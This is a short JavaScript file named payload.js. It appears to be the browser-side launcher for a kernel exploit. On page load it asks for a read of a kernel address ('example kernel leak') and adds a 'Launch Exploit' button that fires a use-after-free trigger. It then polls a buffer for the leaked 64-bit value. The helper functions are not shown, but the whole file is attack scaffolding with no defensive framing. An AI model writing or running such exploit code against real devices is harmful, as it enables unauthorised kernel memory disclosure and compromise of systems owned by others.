window.read_target = new Uint8Array(8);

window.onload = () => {
  debug_log("✅ payload.js loaded");

  for (let i = 0; i < 8; i++) read_target[i] = 0xAA;

  schedule_read64(0xFFFFFFFF82600000); // example kernel leak

  const btn = document.createElement("button");
  btn.textContent = "▶️ Launch Exploit";
  btn.style.fontSize = "24px";
  btn.style.padding = "10px 20px";
  btn.onclick = triggerUAF;

  document.body.appendChild(btn);

  // Start polling for leak
  let tries = 0;
  const view = new DataView(read_target.buffer);
  const interval = setInterval(() => {
    const lo = view.getUint32(0, true);
    const hi = view.getUint32(4, true);
    if (lo !== 0xAAAAAAAA || hi !== 0xAAAAAAAA) {
      const val = (BigInt(hi) << 32n) | BigInt(lo);
      debug_log("✅ read64 result: 0x" + val.toString(16));
      clearInterval(interval);
    }
    if (++tries > 25) {
      debug_log("❌ No leak after 5s");
      clearInterval(interval);
    }
  }, 200);
};
